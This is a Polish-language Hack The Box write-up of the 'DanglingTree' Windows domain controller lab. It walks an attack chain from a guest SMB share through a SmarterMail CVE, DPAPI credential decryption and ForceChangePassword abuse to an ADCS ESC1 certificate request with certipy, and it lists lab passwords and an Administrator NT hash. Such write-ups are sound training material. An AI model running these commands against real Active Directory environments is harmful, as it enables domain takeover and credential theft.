# DanglingTree — Hack The Box (Write-up)

**Autor:** DonMorpheus (lab)  
**Maszyna:** `danglingtree.htb`  
**OS:** Windows Server 2025 (DC)  
**Ścieżka:** guest → anderson → (SM/svc) → noah → alex → jake → ADCS ESC1 → Administrator  

> Flagi i hasła na końcu. Tylko scope HTB / własny lab.

---

## TL;DR

| Faza | Wektor | User |
|------|--------|------|
| Entry | Guest SMB share **IT** → RoE PDF | guest |
| Foothold | WAC HTTPS **:6600** | `anderson.w` |
| Mail/RCE | SmarterMail localhost **:17017** (CVE-2026-23760 / hub) | `svc_mail` |
| User flag | WAC + **LogonUser(noah)** | `noah.b` |
| Cred pivot | DPAPI offline (noah Credential) | `alex.o` |
| ACL pivot | ForceChangePassword (support-it) | `jake.h` |
| Root | ADCS **ESC1** (dangling templates) + SID | **Administrator** |

---

## 1. Recon

```bash
# VPN + hosts
echo '10.129.6.118 dc.danglingtree.htb danglingtree.htb' | sudo tee -a /etc/hosts
nmap -sC -sV -oA nmap/initial 10.129.6.118
```

Istotne: **53, 88, 135, 139/445, 389/636, 3389**, **WAC :6600**, AD CS na DC.  
WinRM 5985 zamknięty z zewnątrz. **Clock skew ~+7h** — Kerberos/PKINIT pada bez sync czasu.

Null session: `Guest` (blank) → share **IT** READ → `DanglingTree_RoE_Assessment.pdf` → credy red team:

| User | Pass |
|------|------|
| `anderson.w` | `R3dT3am@Acc3ss#01` |

---

## 2. Anderson — Windows Admin Center

`anderson.w` ma SMB/LDAP, jest w Remote Management Users, ale realny shell to **WAC** (HTTPS 6600), nie WinRM.

```bash
python3 scripts/wac_ps.py -c 'whoami; hostname'
```

Login WAC: CSRF + RSA-OAEP packet (patrz `scripts/wac_ps.py`).

RID / LSA ujawniają m.in. `jake.h`, `svc_mail`, `noah.b`, `alex.o`.

---

## 3. SmarterMail (lokalnie :17017)

MailService na DC; z zewnątrz 17017 filtered → pivot przez WAC/anderson na `127.0.0.1:17017`.

- **CVE-2026-23760** force-reset PrimarySysAdmin → `svc_mail` (hasło SM ≠ AD)
- Volume mount RCE jako **`DANGLINGTREE\svc_mail`** (nie SYSTEM)
- AD: `svc_mail` / `OceanWave#9Sky!`

Skrypt pomocniczy: `scripts/cve_2026_24423_hub.py` (starszy hub connect-to-hub).

---

## 4. User — noah.b

Hasło noah (cleartext z łańcucha boxa / SM): `RiverDragon#Storm25`.

Stabilny exec (rev shelle często job-killed):

```bash
python3 scripts/noah_exec.py 'type $env:USERPROFILE\Desktop\user.txt'
# anderson WAC → LogonUser(noah) + ImpersonateLoggedOnUser
```

**user.txt** = `<REDACTED_FLAG>`

---

## 5. alex.o — DPAPI z noah

Z sesji noah Credential blob:

- `...\Microsoft\Credentials\57FFB67D684C67F09E7153B9C7CC3940`
- masterkey GUID `f53fcaba-...`

```bash
impacket-dpapi credential -file <cred> -key 0x...
# Username: alex.o
# Password: SunsetMountainPeak@2025
# Target: PC01.danglingtree.htb
```

`alex.o` ∈ **support-it** → ForceChangePassword na `jake.h`.

---

## 6. jake.h — FCP

```bash
python3 scripts/fcp_jake.py
# impacket-changepasswd ... -altuser alex.o -reset -protocol ldap
```

| User | Pass (lab) |
|------|------------|
| `jake.h` | `Zz9!Qk7#Mm2$Xx4@Ww5%Ll2026Dan` |

**jake.h** w:

- `Helpdesk_Cert_Support` → **ManageCertificates** (ESC7)
- `Template_Editors` → **CREATE_CHILD** na Certificate Templates
- `DevOps_PKI` → RDP/WinRM (teoretycznie)

---

## 7. AD CS — ESC1 → Domain Admin

### Stan CA

- CA: `danglingtree-DC-CA` @ `dc.danglingtree.htb`
- CA Enroll: **Authenticated Users**
- ManageCertificates: **Helpdesk_Cert_Support** (jake)
- Web Enrollment: off

### Dangling templates (owner jake)

| Template | Flags | Enroll (po fix DACL) |
|----------|-------|----------------------|
| `EmployeeAuthTemplate` | EnrolleeSuppliesSubject + Client Auth | Authenticated Users |
| `VPNUserTemplate` | j.w. | j.w. |
| `RemoteAccessVPN` | j.w. | j.w. |

Owner = jake → certipy zgłasza **ESC4**; samo ownership **nie** daje WriteProperty na atrybutach (Owner Rights / Server 2025). Działa **WRITE_DACL** na `nTSecurityDescriptor` — dopisanie enroll dla `S-1-5-11` (Authenticated Users) wystarczy do **ESC1**.

```bash
./scripts/sync_time_to_dc.sh 10.129.6.118
python3 scripts/esc1_get_admin.py
```

Ważne przy req:

1. Template z **SAN (UPN)** + Client Authentication  
2. **SID Administratora** (`S-1-5-21-…-500`) w request — bez tego:  
   `Object SID mismatch between certificate and user 'administrator'` (strong mapping)  
3. Clock sync przed PKINIT  

```bash
certipy-ad req -u jake.h@danglingtree.htb -p '...' \
  -dc-ip 10.129.6.118 -target-ip 10.129.6.118 \
  -ca danglingtree-DC-CA -template EmployeeAuthTemplate \
  -upn administrator@danglingtree.htb \
  -sid S-1-5-21-…-500 -out admin-esc1-sid

certipy-ad auth -pfx admin-esc1-sid.pfx -dc-ip 10.129.6.118
# Got hash administrator: aad3b435…:8cacb3a97e460c65d105ca7cd9913925
```

```bash
python3 scripts/get_flags.py
# root.txt z C$\Users\Administrator\Desktop\
```

**root.txt** = `<REDACTED_FLAG>`

---

## Entry map (kto → jaki user)

```
guest (blank)
  └─ anderson.w (RoE PDF / WAC :6600)          ← entry systemowy
       ├─ svc_mail (SmarterMail force-reset/RCE)
       └─ noah.b (LogonUser)                   ← USER flag
            └─ alex.o (DPAPI credential)
                 └─ jake.h (FCP / ADCS groups)
                      └─ Administrator (ESC1 cert)  ← ROOT / DA
```

---

## Flags

| Flag | Hash |
|------|------|
| user | `<REDACTED_FLAG>` |
| root | `<REDACTED_FLAG>` |

## Creds (lab)

| Principal | Secret |
|-----------|--------|
| anderson.w | `R3dT3am@Acc3ss#01` |
| noah.b | `RiverDragon#Storm25` |
| svc_mail (AD) | `OceanWave#9Sky!` |
| alex.o | `SunsetMountainPeak@2025` |
| jake.h | `Zz9!Qk7#Mm2$Xx4@Ww5%Ll2026Dan` |
| Administrator (NT) | `aad3b435b51404eeaad3b435b51404ee:8cacb3a97e460c65d105ca7cd9913925` |

---

## Replay skryptów

```bash
./scripts/sync_time_to_dc.sh
python3 scripts/wac_ps.py -c 'whoami'
python3 scripts/noah_exec.py 'hostname'
python3 scripts/fcp_jake.py          # jeśli jake reset
python3 scripts/esc1_get_admin.py
python3 scripts/get_flags.py
```

Szczegóły: `scripts/README.md`, `ACCESS.md`, `loot/copy-paste.txt`.
